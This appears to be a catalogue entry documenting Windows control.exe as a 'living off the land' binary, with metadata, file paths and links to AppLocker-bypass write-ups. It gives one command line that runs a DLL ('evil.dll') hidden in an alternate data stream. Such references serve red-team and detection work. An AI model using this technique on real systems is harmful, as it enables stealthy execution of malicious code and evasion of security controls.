## Control.exe
```

control.exe c:\windows\tasks\file.txt:evil.dll
Execute evil.dll which is stored in an Alternate Data Stream (ADS).
```
* Windows binary: True   
* Bypasses Default AppLocker Rules: False   
* Mitre: []()   
   
* Links:   
  * https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/
  * https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/
  * https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/
  * https://twitter.com/bohops/status/955659561008017409
   
* File path:   
  * C:\Windows\system32\control.exe
  * C:\Windows\sysWOW64\control.exe
   
* Acknowledgement:   
  * Name: Jimmy
    * Twitter: [@Bohops](https://twitter.com/@Bohops)
    * Blog: https://bohops.com
   
OS:  
